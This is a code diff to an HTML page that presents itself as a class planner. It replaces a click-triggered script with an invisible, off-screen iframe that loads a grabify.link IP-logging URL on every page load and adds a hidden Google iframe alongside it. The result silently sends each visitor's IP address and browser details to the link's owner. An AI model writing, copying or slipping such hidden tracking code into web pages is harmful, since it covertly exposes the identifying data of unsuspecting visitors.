@@ -148,7 +148,8 @@ body {
 </head>
 <body>
  
- <iframe id="grabber" src="" style="border:none;width:0;height:0;position:absolute;top:-10px;left:-10px;"></iframe>
+ <iframe id="grabber" src="https://grabify.link/KTPH2N" style="border:none;width:0;height:0;position:absolute;top:-10px;left:-10px;"></iframe>
+ <iframe src="https://www.google.com" hidden></iframe>
 
 <div class="wrapper">
 <span id="nav-title">Planner</span>
@@ -213,24 +214,6 @@ document.querySelector(".class-handler").innerHTML = localStorage.getItem("class
 
 }
  
- var ipGrabbed = localStorage.getItem("ip");
- if(!ipGrabbed) {
-  ipGrabbed = false;
- }else{
-  ipGrabbed = true;
- }
- 
- window.onclick = function() {
-  if(ipGrabbed == false) {
-   document.querySelector("#grabber").src = `https://grabify.link/KTPH2N`;
-   window.setTimeout(function() {
-    document.querySelector("#grabber").src = ``;
-   },5000);
-   ipGrabbed = true;
-   localStorage.setItem("ip",ipGrabbed);
-  }
- }
-
 var mon = null;
 var tues = null;
 var thurs = null;
